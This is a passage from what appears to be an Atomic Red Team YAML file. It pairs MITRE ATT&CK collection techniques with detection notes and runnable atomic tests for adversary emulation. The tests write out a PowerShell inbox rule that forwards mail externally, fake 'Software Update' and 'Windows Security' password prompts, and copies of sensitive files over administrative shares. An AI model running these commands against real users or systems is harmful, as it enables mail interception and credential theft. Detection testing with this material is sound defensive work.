        US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries
        to maintain persistent access to victim's emails even after compromised credentials
        are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most
        email clients allow users to create inbox rules for various email functions,
        including forwarding to a different recipient. These rules may be created
        through a local email application, a web interface, or by command-line interface.
        Messages can be forwarded to internal or external recipients, and there are
        no restrictions limiting the extent of this rule. Administrators may also
        create forwarding rules for user accounts with the same considerations and
        outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation:
        Mac Forwarding Rules)\n\nAny user or administrator within the organization
        (or adversary with valid credentials) can create rules to automatically forward
        all received messages to another recipient, forward emails to different locations
        based on the sender, and more. Adversaries may also hide the rule by making
        use of the Microsoft Messaging API (MAPI) to modify the rule properties, making
        it hidden and not visible from Outlook, OWA or most Exchange Administration
        tools.(Citation: Pfammatter - Hidden Inbox Rules)\n\nIn some environments,
        administrators may be able to enable email forwarding rules that operate organization-wide
        rather than on individual inboxes. For example, Microsoft Exchange supports
        transport rules that evaluate all mail an organization receives against user-specified
        conditions, then performs a user-specified action on mail that adheres to
        those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that
        abuse such features may be able to enable forwarding on all or specific mail
        an organization receives. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_contributors:
      - Microsoft Security
      - Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)
      - Liran Ravich, CardinalOps
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. This is especially true in cases with hidden auto-forwarding rules. This makes it only possible to reliably detect the existence of a hidden auto-forwarding rule by examining message tracking logs or by using a MAPI editor to notice the modified rule property values.(Citation: Pfammatter - Hidden Inbox Rules)

        Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include `X-MS-Exchange-Organization-AutoForwarded` set to true, `X-MailFwdBy` and `X-Forwarded-To`. The `forwardingSMTPAddress` parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the `X-MS-Exchange-Organization-AutoForwarded` header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Office 365
      - Windows
      - Google Workspace
      - macOS
      - Linux
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Command: Command Execution'
      type: attack-pattern
      id: attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0
      created: '2020-02-19T18:54:47.103Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1114/003
        external_id: T1114.003
      - source_name: Mac Forwarding Rules
        description: Apple. (n.d.). Reply to, forward, or redirect emails in Mail
          on Mac. Retrieved June 22, 2021.
        url: https://support.apple.com/guide/mail/reply-to-forward-or-redirect-emails-mlhlp1010/mac
      - source_name: Pfammatter - Hidden Inbox Rules
        description: Damian Pfammatter. (2018, September 17). Hidden Inbox Rules in
          Microsoft Exchange. Retrieved October 12, 2021.
        url: https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/
      - source_name: Microsoft Tim McMichael Exchange Mail Forwarding 2
        description: McMichael, T.. (2015, June 8). Exchange and Office 365 Mail Forwarding.
          Retrieved October 8, 2019.
        url: https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/
      - source_name: Microsoft Mail Flow Rules 2023
        description: Microsoft. (2023, February 22). Mail flow rules (transport rules)
          in Exchange Online. Retrieved March 13, 2023.
        url: https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/mail-flow-rules
      - source_name: US-CERT TA18-068A 2018
        description: US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted
          by Cyber Actors. Retrieved October 2, 2019.
        url: https://www.us-cert.gov/ncas/alerts/TA18-086A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1114.003
    atomic_tests:
    - name: Office365 - Email Forwarding
      auto_generated_guid: 3234117e-151d-4254-9150-3d0bac41e38c
      description: 'Creates a new Inbox Rule to forward emails to an external user
        via the "ForwardTo" property of the New-InboxRule Powershell cmdlet.

        '
      supported_platforms:
      - office-365
      input_arguments:
        username:
          description: office-365 username
          type: string
          default: 
        password:
          description: office-365 password
          type: string
          default: 
        rule_name:
          description: email rule name
          type: string
          default: Atomic Red Team Email Rule
        forwarding_email:
          description: destination email addresses
          type: string
          default: Atomic_Operator@fakeemail.aq
      dependency_executor_name: powershell
      dependencies:
      - description: "ExchangeOnlineManagement PowerShell module must be installed.
          Your user must also have an Exchange license. \n"
        prereq_command: |
          $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
          if (-not $RequiredModule) {exit 1}
          if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}
        get_prereq_command: "Install-Module -Name ExchangeOnlineManagement         \nImport-Module
          ExchangeOnlineManagement\n"
      executor:
        command: |
          $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
          $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
          Connect-ExchangeOnline -Credential $creds
          New-InboxRule -Name "#{rule_name}" -ForwardTo "#{forwarding_email}"
        cleanup_command: |
          $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
          $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
          Connect-ExchangeOnline -Credential $creds
          Get-InboxRule | Where-Object { $_.Name -eq "#{rule_name}" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }
        name: powershell
        elevation_required: false
  T1074:
    technique:
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Praetorian
      - Shane Tully, @securitygypsy
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e
      created: '2017-05-31T21:30:58.938Z'
      x_mitre_version: '1.4'
      external_references:
      - source_name: mitre-attack
        external_id: T1074
        url: https://attack.mitre.org/techniques/T1074
      - source_name: Mandiant M-Trends 2020
        url: https://content.fireeye.com/m-trends/rpt-m-trends-2020
        description: Mandiant. (2020, February). M-Trends 2020. Retrieved April 24,
          2020.
      - source_name: PWC Cloud Hopper April 2017
        url: https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf
        description: PwC and BAE Systems. (2017, April). Operation Cloud Hopper. Retrieved
          April 5, 2017.
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)

        In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)

        Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.
      modified: '2022-07-20T20:07:40.167Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Data Staged
      x_mitre_detection: |-
        Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

        Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        Consider monitoring accesses and modifications to storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Creation'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'File: File Access'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1056.002:
    technique:
      modified: '2023-03-30T21:01:48.279Z'
      name: 'Input Capture: GUI Input Capture'
      description: "Adversaries may mimic common operating system GUI components to
        prompt users for credentials with a seemingly legitimate prompt. When programs
        are executed that need additional privileges than are present in the current
        user context, it is common for the operating system to prompt the user for
        proper credentials to authorize the elevated privileges for the task (ex:
        [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries
        may mimic this functionality to prompt users for credentials with a seemingly
        legitimate prompt for a number of reasons that mimic normal usage, such as
        a fake installer requiring additional access or a fake malware removal suite.(Citation:
        OSX Malware Exploits MacKeeper) This type of prompt can be used to collect
        credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation:
        LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation:
        Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation:
        LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials
        Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries
        may launch dialog boxes prompting users for credentials from malicious shell
        scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation:
        Spoofing credential dialogs) "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Matthew Molyett, @s1air, Cisco Talos
      x_mitre_detection: "Monitor process execution for unusual programs as well as
        malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)
        that could be used to prompt users for credentials. For example, command/script
        history including abnormal parameters (such as requests for credentials and/or
        strings related to creating password prompts) may be malicious.(Citation:
        Spoofing credential dialogs) \n\nInspect and scrutinize input prompts for
        indicators of illegitimacy, such as non-traditional banners, text, timing,
        and/or sources. "
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - macOS
      - Windows
      - Linux
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Script: Script Execution'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
      type: attack-pattern
      id: attack-pattern--a2029942-0a85-4947-b23c-ca434698171d
      created: '2020-02-11T18:58:45.908Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1056/002
        external_id: T1056.002
      - source_name: OSX Malware Exploits MacKeeper
        description: Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits
          Mackeeper. Retrieved July 3, 2017.
        url: https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html
      - source_name: LogRhythm Do You Trust Oct 2014
        description: Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved
          December 17, 2018.
        url: https://logrhythm.com/blog/do-you-trust-your-computer/
      - source_name: OSX Keydnap malware
        description: Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware
          is hungry for credentials. Retrieved July 3, 2017.
        url: https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/
      - source_name: Spoofing credential dialogs
        description: Johann Rehberger. (2021, April 18). Spoofing credential dialogs
          on macOS Linux and Windows. Retrieved August 19, 2021.
        url: https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/
      - source_name: Enigma Phishing for Credentials Jan 2015
        description: 'Nelson, M. (2015, January 21). Phishing for Credentials: If
          you want it, just ask!. Retrieved December 17, 2018.'
        url: https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1056.002
    atomic_tests:
    - name: AppleScript - Prompt User for Password
      auto_generated_guid: 76628574-0bc1-4646-8fe2-8f4427b47d15
      description: |
        Prompt User for Password (Local Phishing)
        Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
      supported_platforms:
      - macos
      executor:
        command: 'osascript -e ''tell app "System Preferences" to activate'' -e ''tell
          app "System Preferences" to activate'' -e ''tell app "System Preferences"
          to display dialog "Software Update requires that you type your password
          to apply changes." & return & return  default answer "" with icon 1 with
          hidden answer with title "Software Update"''

          '
        name: bash
    - name: PowerShell - Prompt User for Password
      auto_generated_guid: 2b162bfd-0928-4d4c-9ec3-4d9f88374b52
      description: |
        Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.

        Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py
      supported_platforms:
      - windows
      executor:
        command: "# Creates GUI to prompt for password. Expect long pause before prompt
          is available.    \n$cred = $host.UI.PromptForCredential('Windows Security
          Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using
          write-warning to allow message to show on console as echo and other similar
          commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning
          $cred.GetNetworkCredential().Password\n"
        name: powershell
  T1039:
    technique:
      modified: '2023-03-30T21:01:35.611Z'
      name: Data from Network Shared Drive
      description: Adversaries may search network shares on computers they have compromised
        to find files of interest. Sensitive data can be collected from remote systems
        via shared network drives (host shared directory, network file server, etc.)
        that are accessible from the current system prior to Exfiltration. Interactive
        command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
        may be used to gather information.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - David Tayouri
      x_mitre_deprecated: false
      x_mitre_detection: Monitor processes and command-line arguments for actions
        that could be taken to collect files from a network share. Remote access tools
        with built-in features may interact directly with the Windows API to gather
        data. Data may also be acquired through Windows system management tools such
        as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
        and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Share: Network Share Access'
      - 'Network Traffic: Network Connection Creation'
      - 'File: File Access'
      x_mitre_system_requirements:
      - Privileges to access network shared drive
      type: attack-pattern
      id: attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c
      created: '2017-05-31T21:30:41.022Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1039
        external_id: T1039
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      identifier: T1039
    atomic_tests:
    - name: Copy a sensitive File over Administrative share with copy
      auto_generated_guid: 6ed67921-1774-44ba-bac6-adb51ed60660
      description: |-
        Copy from sensitive File from the c$ of another LAN computer with copy cmd
        https://twitter.com/SBousseaden/status/1211636381086339073
      supported_platforms:
      - windows
      input_arguments:
        remote:
          description: Remote server name
          type: string
          default: 127.0.0.1
        share_file:
          description: Remote Path to the file
          type: path
          default: Windows\temp\Easter_Bunny.password
        local_file:
          description: Local name
          type: string
          default: Easter_egg.password
      dependency_executor_name: powershell
      dependencies:
      - description: 'Administrative share must exist on #{remote}

          '
        prereq_command: 'if (Test-Path "\\#{remote}\C$") {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host ''Please Enable "C$" share on #{remote}''

          '
      - description: '"\\#{remote}\C$\#{share_file}" must exist on #{remote}

          '
        prereq_command: 'if (Test-Path "\\#{remote}\C$\#{share_file}") {exit 0} else
          {exit 1}

          '
        get_prereq_command: 'Out-File -FilePath "\\#{remote}\C$\#{share_file}"

          '
      executor:
        command: copy \\#{remote}\C$\#{share_file} %TEMP%\#{local_file}
        cleanup_command: |-
          del \\#{remote}\C$\#{share_file}
          del %TEMP%\#{local_file}
        name: command_prompt
        elevation_required: true
    - name: Copy a sensitive File over Administrative share with Powershell
      auto_generated_guid: 7762e120-5879-44ff-97f8-008b401b9a98
      description: |-
        Copy from sensitive File from the c$ of another LAN computer with powershell
        https://twitter.com/SBousseaden/status/1211636381086339073
      supported_platforms:
      - windows
      input_arguments:
        remote:
          description: Remote server name
          type: string
          default: 127.0.0.1
        share_file:
          description: Remote Path to the file
          type: path
          default: Windows\temp\Easter_Bunny.password
        local_file:
          description: Local name
          type: string
          default: Easter_egg.password
      dependency_executor_name: powershell
      dependencies:
      - description: 'Administrative share must exist on #{remote}

          '
        prereq_command: 'if (Test-Path "\\#{remote}\C$") {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host ''Please Enable "C$" share on #{remote}''

          '
      - description: '"\\#{remote}\C$\#{share_file}" must exist on #{remote}

          '
        prereq_command: 'if (Test-Path "\\#{remote}\C$\#{share_file}") {exit 0} else
          {exit 1}

          '
        get_prereq_command: 'Out-File -FilePath "\\#{remote}\C$\#{share_file}"

          '
      executor:
        command: copy-item -Path "\\#{remote}\C$\#{share_file}" -Destination "$Env:TEMP\#{local_file}"
        cleanup_command: |-
          Remove-Item -Path "\\#{remote}\C$\#{share_file}"
          Remove-Item -Path "$Env:TEMP\#{local_file}"
        name: powershell
        elevation_required: true
  T1114.002:
    technique:
      x_mitre_platforms:
      - Office 365
      - Windows
      - Google Workspace
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a
      type: attack-pattern
      created: '2020-02-19T18:52:24.547Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1114.002
        url: https://attack.mitre.org/techniques/T1114/002
      modified: '2021-03-25T13:12:56.909Z'
      name: Remote Email Collection
      description: Adversaries may target an Exchange server, Office 365, or Google
        Workspace to collect sensitive information. Adversaries may leverage a user's
        credentials and interact directly with the Exchange server to acquire information
        from within a network. Adversaries may also access externally facing Exchange
        services, Office 365, or Google Workspace to access email using credentials
        or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413)
        can be used to automate searches for specific keywords.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: 'Monitor for unusual login activity from unknown or abnormal
        locations, especially for privileged accounts (ex: Exchange administrator
        account).'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Command: Command Execution'
      - 'Logon Session: Logon Session Creation'
    atomic_tests: []
  T1056:
    technique:
      modified: '2023-03-30T21:01:41.752Z'
      name: Input Capture
      description: Adversaries may use methods of capturing user input to obtain credentials
        or collect information. During normal system usage, users often provide credentials
        to various different locations, such as login pages/portals or system dialog
        boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential
        API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving
        the user into providing input into what they believe to be a genuine service
        (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - John Lambert, Microsoft Threat Intelligence Center
      x_mitre_detection: 'Detection may vary depending on how input is captured but
        may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`,
        `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke),
        monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059),
        and ensuring no unauthorized drivers or kernel modules that could indicate
        keylogging or API hooking are present.'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Driver: Driver Load'
      - 'Process: Process Metadata'
      - 'Process: Process Creation'
      - 'File: File Modification'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Process: OS API Execution'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      - root
      - User
      type: attack-pattern
      id: attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2
      created: '2017-05-31T21:30:48.323Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1056
        external_id: T1056
      - source_name: Adventures of a Keystroke
        description: 'Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth
          look into keyloggers on Windows. Retrieved April 27, 2016.'
        url: http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1557.002:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Jon Sternstein, Stern Security
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213
      created: '2020-10-15T12:05:58.755Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1557.002
        url: https://attack.mitre.org/techniques/T1557/002
      - source_name: Cylance Cleaver
        url: https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf
        description: Cylance. (2014, December). Operation Cleaver. Retrieved September
          14, 2017.
      - source_name: RFC826 ARP
        url: https://tools.ietf.org/html/rfc826
        description: Plummer, D. (1982, November). An Ethernet Address Resolution
          Protocol. Retrieved October 15, 2020.
      - source_name: Sans ARP Spoofing Aug 2003
        url: https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411
        description: Siles, R. (2003, August). Real World ARP Spoofing. Retrieved
          October 15, 2020.
      x_mitre_deprecated: false
      revoked: false
      description: |
        Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

        The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.

        An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.

        The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)

        Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)
      modified: '2022-07-22T18:37:22.176Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: ARP Cache Poisoning
      x_mitre_detection: "Monitor network traffic for unusual ARP traffic, gratuitous
        ARP replies may be suspicious. \n\nConsider collecting changes to ARP caches
        across endpoints for signs of ARP poisoning. For example, if multiple IP addresses
        map to a single MAC address, this could be an indicator that the ARP cache
        has been poisoned."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1213.003:
    technique:
      modified: '2022-10-18T22:44:01.723Z'
      name: Code Repositories
      description: |-
        Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.

        Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)

        **Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: Monitor access to code repositories, especially performed
        by privileged users such as Active Directory Domain or Enterprise Administrators
        as these types of accounts should generally not be used to access code repositories.
        In environments with high-maturity, it may be possible to leverage User-Behavioral
        Analytics (UBA) platforms to detect and alert on user-based anomalies.
      x_mitre_platforms:
      - SaaS
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.1'
      x_mitre_contributors:
      - Itamar Mizrahi, Cymptom
      - Toby Kohlenberg
      - Josh Liburdi, @jshlbrd
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Logon Session: Logon Session Creation'
      type: attack-pattern
      id: attack-pattern--cff94884-3b1c-4987-a70b-6d5643c621c3
      created: '2021-05-11T18:51:16.343Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1213/003
        external_id: T1213.003
      - source_name: Wired Uber Breach
        description: 'Andy Greenberg. (2017, January 21). Hack Brief: Uber Paid Off
          Hackers to Hide a 57-Million User Data Breach. Retrieved May 14, 2021.'
        url: https://www.wired.com/story/uber-paid-off-hackers-to-hide-a-57-million-user-data-breach/
      - source_name: Krebs Adobe
        description: Brian Krebs. (2013, October 3). Adobe To Announce Source Code,
          Customer Data Breach. Retrieved May 17, 2021.
        url: https://krebsonsecurity.com/2013/10/adobe-to-announce-source-code-customer-data-breach/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1213:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      - SaaS
      - Office 365
      - Google Workspace
      - IaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Naveen Vijayaraghavan, Nilesh Dherange (Gurucul)
      - Regina Elwell
      - Praetorian
      - Milos Stojadinovic
      - Isif Ibrahima, Mandiant
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416
      created: '2018-04-18T17:59:24.739Z'
      x_mitre_version: '3.2'
      external_references:
      - source_name: mitre-attack
        external_id: T1213
        url: https://attack.mitre.org/techniques/T1213
      - source_name: Atlassian Confluence Logging
        url: https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html
        description: Atlassian. (2018, January 9). How to Enable User Access Logging.
          Retrieved April 4, 2018.
